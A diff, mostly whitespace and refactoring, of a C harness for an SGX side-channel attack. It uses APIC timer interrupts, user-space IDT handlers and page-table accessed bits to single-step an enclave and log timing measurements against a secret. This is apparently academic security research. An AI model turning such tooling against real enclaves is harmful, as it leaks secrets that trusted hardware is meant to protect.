@@ -58,10 +58,8 @@
 #endif
 
 sgx_enclave_id_t eid = 0;
-int strlen_nb_access = 0;
 int irq_cnt = 0, do_irq = 1, fault_cnt = 0;
 uint64_t *pte_encl = NULL;
-uint64_t *pte_str_encl = NULL;
 
 uint8_t *do_cnt_instr; // shared variable. If this is 1 we start measuring
 uint8_t do_cnt_instr_old = 0;
@@ -69,10 +67,10 @@ uint8_t do_cnt_instr_old = 0;
 typedef struct measurement_t
 {
     uint64_t cycles;
-    // uint32_t page_nr;
     uint8_t accessed;
     uint8_t do_count;
 } measurement_t;
+
 measurement_t *log_arr;
 size_t log_arr_size;
 size_t cur_measurement_index;
@@ -83,9 +81,11 @@ size_t cur_measurement_index;
 uint64_t aep_cb_func(void)
 {
     uint8_t cnt_instr;
-    // uint64_t erip = edbgrd_erip() - (uint64_t)get_enclave_base();
-    // info("hello, irq=%d, accessed=%d, do_cnt_instr=%d", irq_cnt, ACCESSED(*pte_encl), *do_cnt_instr);
-    // info("^^ enclave RIP=%#llx; ACCESSED=%d, do_cnt_instr=%d", erip, ACCESSED(*pte_encl), *do_cnt_instr);
+    #if 0
+        uint64_t erip = edbgrd_erip() - (uint64_t)get_enclave_base();
+        info("hello, irq=%d, accessed=%d, do_cnt_instr=%d", irq_cnt, ACCESSED(*pte_encl), *do_cnt_instr);
+        info("^^ enclave RIP=%#llx; ACCESSED=%d, do_cnt_instr=%d", erip, ACCESSED(*pte_encl), *do_cnt_instr);
+    #endif
     irq_cnt++;
 
     if ( __builtin_expect(do_irq && (irq_cnt > NUM_RUNS * 500), 0) ) {
@@ -113,7 +113,7 @@ uint64_t aep_cb_func(void)
      * _unprotected_ PMD "accessed" bit below, so as to slightly slow down
      * ERESUME such that the interrupt reliably arrives in the first subsequent
      * enclave instruction.
-     * 
+     *
      */
     if (__builtin_expect(do_irq, 1))
     {
@@ -160,17 +160,17 @@ int irq_count = 0;
 void irq_handler(uint8_t *rsp)
 {
     uint64_t *p = (uint64_t *)rsp;
-#if 0
-    printf("\n");
-    info("****** hello world from user space IRQ handler with count=%d ******",
-        irq_count++);
+    #if 0
+        printf("\n");
+        info("****** hello world from user space IRQ handler with count=%d ******",
+            irq_count++);
 
-    info("APIC TPR/PPR is %d/%d", apic_read(APIC_TPR), apic_read(APIC_PPR));
-    info("RSP at %p", rsp);
-    info("RIP is %p", *p++);
-    info("CS is %p", *p++);
-    info("EFLAGS is %p", *p++);
-#endif
+        info("APIC TPR/PPR is %d/%d", apic_read(APIC_TPR), apic_read(APIC_PPR));
+        info("RSP at %p", rsp);
+        info("RIP is %p", *p++);
+        info("CS is %p", *p++);
+        info("EFLAGS is %p", *p++);
+    #endif
 }
 
 /* ================== ATTACKER INIT/SETUP ================= */
@@ -199,7 +199,7 @@ void attacker_config_runtime(void)
 void attacker_config_page_table(void)
 {
     void *code_adrs;
-    
+
     #if (ATTACK_SCENARIO == MICROBENCH)
         SGX_ASSERT(get_asm_secret_branch_adrs(eid, &code_adrs));
     #elif (ATTACK_SCENARIO == IPP_LIB)
@@ -209,9 +209,9 @@ void attacker_config_page_table(void)
     //print_page_table( code_adrs );
     info("enclave trigger code adrs at %p\n", code_adrs);
     ASSERT(pte_encl = remap_page_table_level(code_adrs, PTE));
-#if SINGLE_STEP_ENABLE
-    *pte_encl = MARK_EXECUTE_DISABLE(*pte_encl);
-#endif
+    #if SINGLE_STEP_ENABLE
+        *pte_encl = MARK_EXECUTE_DISABLE(*pte_encl);
+    #endif
 
     //print_page_table( get_enclave_base() );
 }
@@ -233,26 +233,28 @@ int main(int argc, char **argv)
     attacker_config_runtime();
     attacker_config_page_table();
 
-#if USER_IDT_ENABLE
-    info_event("Establishing user space APIC/IDT mappings");
-    map_idt(&idt);
-    install_user_irq_handler(&idt, irq_handler, IRQ_VECTOR);
-    //dump_idt(&idt);
-    apic_timer_oneshot(IRQ_VECTOR);
-#else
-    info_event("Establishing user space APIC mapping (with kernel space handler)");
-    apic_timer_oneshot(LOCAL_TIMER_VECTOR);
-#endif
+    #if USER_IDT_ENABLE
+        info_event("Establishing user space APIC/IDT mappings");
+        map_idt(&idt);
+        install_user_irq_handler(&idt, irq_handler, IRQ_VECTOR);
+        //dump_idt(&idt);
+        apic_timer_oneshot(IRQ_VECTOR);
+    #else
+        info_event("Establishing user space APIC mapping (with kernel space handler)");
+        apic_timer_oneshot(LOCAL_TIMER_VECTOR);
+    #endif
 
-/* TODO for some reason the Dell Latitude machine first needs 2 SW IRQs
-     * before the timer IRQs even fire (??) */
-#if USER_IDT_ENABLE
-    info_event("Triggering user space software interrupts");
-    asm("int %0\n\t" ::"i"(IRQ_VECTOR)
-        :);
-    asm("int %0\n\t" ::"i"(IRQ_VECTOR)
-        :);
-#endif
+    /*
+     * TODO for some reason the Dell Latitude machine first needs 2 SW IRQs
+     * before the timer IRQs even fire (??)
+     */
+    #if USER_IDT_ENABLE
+        info_event("Triggering user space software interrupts");
+        asm("int %0\n\t" ::"i"(IRQ_VECTOR)
+            :);
+        asm("int %0\n\t" ::"i"(IRQ_VECTOR)
+            :);
+    #endif
 
     info("generating random secret");
     int secret_arr_size;
@@ -302,7 +304,7 @@ int main(int argc, char **argv)
 
     info_event("all done; counted %d IRQs", irq_cnt);
 
-    const char* fname = "./logs/measurements.txt"; 
+    const char* fname = "./logs/measurements.txt";
     const char* sname = "./logs/secrets.txt";
     FILE *sf = fopen(sname, "w");
 
@@ -346,8 +348,8 @@ int main(int argc, char **argv)
         // increment secret
         old_cnt = log_arr[i].do_count;
     }
-    #endif 
-    
+    #endif
+
     fclose(sf);
     fclose(fp);
     free(log_arr);
